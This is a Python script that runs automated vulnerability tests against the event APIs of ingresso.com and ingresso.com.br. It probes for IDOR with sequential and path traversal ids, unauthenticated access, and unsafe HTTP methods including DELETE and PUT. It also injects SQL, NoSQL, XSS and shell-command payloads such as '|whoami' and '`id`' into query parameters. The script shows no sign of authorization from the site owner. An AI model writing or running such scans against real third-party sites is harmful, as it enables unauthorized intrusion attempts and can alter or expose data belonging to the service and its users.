#!/usr/bin/env python3
"""
Deep API Testing for discovered endpoints
Focus on high-value vulnerabilities
"""

import requests
import json
import time
import warnings
warnings.filterwarnings('ignore')

class APIDeepTest:
    def __init__(self):
        self.discovered_apis = [
            "https://ingresso.com/api/events",
            "https://www.ingresso.com/api/events", 
            "https://ingresso.com.br/api/events",
            "https://www.ingresso.com.br/api/events"
        ]
        self.findings = []
        
    def test_idor_vulnerabilities(self, base_url):
        """Test for Insecure Direct Object Reference"""
        print(f"[IDOR] Testing {base_url}")
        
        # Test different ID patterns
        test_ids = ['1', '2', '100', '999', '9999', '../admin', '../../users']
        
        for test_id in test_ids:
            try:
                url = f"{base_url}/{test_id}"
                response = requests.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Check for sensitive data patterns
                    sensitive_patterns = [
                        'email', 'password', 'token', 'admin', 
                        'cpf', 'credit_card', 'payment'
                    ]
                    
                    content = response.text.lower()
                    for pattern in sensitive_patterns:
                        if pattern in content:
                            self.findings.append({
                                'type': 'IDOR - Sensitive Data Exposure',
                                'severity': 'High',
                                'url': url,
                                'description': f'Potential sensitive data exposure via IDOR: {pattern}',
                                'status_code': response.status_code
                            })
                            break
                            
            except Exception as e:
                continue
            time.sleep(2)
    
    def test_api_authentication(self, base_url):
        """Test API authentication bypass"""
        print(f"[AUTH] Testing authentication bypass on {base_url}")
        
        # Test without authentication
        try:
            response = requests.get(base_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Check if API returns data without auth
                try:
                    data = response.json()
                    if isinstance(data, (list, dict)) and data:
                        self.findings.append({
                            'type': 'Unauthenticated API Access',
                            'severity': 'Medium',
                            'url': base_url,
                            'description': 'API returns data without authentication',
                            'response_size': len(response.text)
                        })
                except:
                    pass
                    
        except Exception as e:
            pass
    
    def test_http_methods(self, base_url):
        """Test different HTTP methods"""
        print(f"[METHODS] Testing HTTP methods on {base_url}")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        for method in methods:
            try:
                response = requests.request(method, base_url, timeout=10, verify=False)
                
                if response.status_code not in [403, 404, 405, 501]:
                    self.findings.append({
                        'type': f'HTTP Method {method} Allowed',
                        'severity': 'Low' if method in ['GET', 'OPTIONS'] else 'Medium',
                        'url': base_url,
                        'description': f'{method} method returns {response.status_code}',
                        'status_code': response.status_code
                    })
                    
            except Exception as e:
                continue
            time.sleep(1)
    
    def test_parameter_pollution(self, base_url):
        """Test for parameter pollution"""
        print(f"[PARAM] Testing parameter pollution on {base_url}")
        
        # Test common parameters
        test_params = {
            'id': ['1', '2'],
            'user_id': ['1', '2'], 
            'event_id': ['1', '2'],
            'limit': ['10', '999999'],
            'offset': ['0', '-1']
        }
        
        for param, values in test_params.items():
            # Test parameter pollution (same param multiple times)
            pollution_url = f"{base_url}?{param}={values[0]}&{param}={values[1]}"
            
            try:
                response = requests.get(pollution_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    self.findings.append({
                        'type': 'Parameter Pollution Accepted',
                        'severity': 'Low',
                        'url': pollution_url,
                        'description': f'Server accepts parameter pollution for {param}',
                        'status_code': response.status_code
                    })
                    
            except Exception as e:
                continue
            time.sleep(2)
    
    def test_injection_patterns(self, base_url):
        """Test for injection vulnerabilities"""
        print(f"[INJECTION] Testing injection patterns on {base_url}")
        
        # Safe injection test payloads
        payloads = {
            'sql': ["'", "1'", "1' OR '1'='1"],
            'nosql': ['{"$gt":""}', '{"$ne":null}'],
            'xss': ['<script>alert(1)</script>', '"><script>alert(1)</script>'],
            'command': [';ls', '|whoami', '`id`']
        }
        
        test_params = ['id', 'search', 'q', 'filter']
        
        for param in test_params:
            for injection_type, injection_payloads in payloads.items():
                for payload in injection_payloads:
                    try:
                        test_url = f"{base_url}?{param}={payload}"
                        response = requests.get(test_url, timeout=10, verify=False)
                        
                        # Check for error patterns
                        error_patterns = {
                            'sql': ['mysql_fetch_array', 'ORA-01756', 'SQLServer JDBC'],
                            'nosql': ['MongoError', 'CastError'],
                            'xss': ['<script>alert(1)</script>'],
                            'command': ['uid=', 'gid=', 'root:']
                        }
                        
                        content = response.text.lower()
                        for error in error_patterns.get(injection_type, []):
                            if error.lower() in content:
                                self.findings.append({
                                    'type': f'{injection_type.upper()} Injection',
                                    'severity': 'High',
                                    'url': test_url,
                                    'description': f'Potential {injection_type} injection detected',
                                    'error_pattern': error
                                })
                                break
                                
                    except Exception as e:
                        continue
                    time.sleep(3)  # Longer delay for injection tests
    
    def run_deep_api_tests(self):
        """Run comprehensive API testing"""
        print("=" * 60)
        print("DEEP API TESTING - HIGH VALUE VULNERABILITIES")
        print("=" * 60)
        
        for api_url in self.discovered_apis:
            print(f"\nTesting API: {api_url}")
            print("-" * 40)
            
            # Run all tests on this API
            self.test_api_authentication(api_url)
            self.test_idor_vulnerabilities(api_url)
            self.test_http_methods(api_url)
            self.test_parameter_pollution(api_url)
            self.test_injection_patterns(api_url)
            
            time.sleep(5)  # Delay between APIs
        
        # Save results
        results = {
            'tested_apis': self.discovered_apis,
            'total_findings': len(self.findings),
            'findings': self.findings,
            'high_value_findings': [f for f in self.findings if f['severity'] in ['High', 'Critical']]
        }
        
        with open('api_deep_test_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        # Summary
        print("\n" + "=" * 60)
        print("DEEP API TESTING SUMMARY")
        print("=" * 60)
        print(f"APIs tested: {len(self.discovered_apis)}")
        print(f"Total findings: {len(self.findings)}")
        print(f"High/Critical findings: {len(results['high_value_findings'])}")
        
        if results['high_value_findings']:
            print("\nHIGH VALUE FINDINGS:")
            for finding in results['high_value_findings']:
                print(f"  [{finding['severity']}] {finding['type']} - {finding['url']}")
        
        print(f"\nResults saved: api_deep_test_results.json")
        
        return results

def main():
    tester = APIDeepTest()
    results = tester.run_deep_api_tests()

if __name__ == "__main__":
    main()